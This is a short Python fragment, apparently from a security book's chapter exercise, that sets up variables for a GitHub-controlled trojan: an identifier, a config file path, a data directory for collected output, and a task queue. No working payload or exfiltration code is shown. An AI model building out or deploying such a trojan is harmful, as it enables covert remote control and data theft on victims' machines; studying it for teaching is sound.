import json, base64, sys, time, imp, random, threading, os
from queue import Queue
from github3 import login

trojan_id = "abc" # unique id for this trojan
relative_path = "./Chapter_07/"
trojan_config = relative_path + "{0}.json".format(trojan_id)
data_path = relative_path + "data/{0}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = Queue()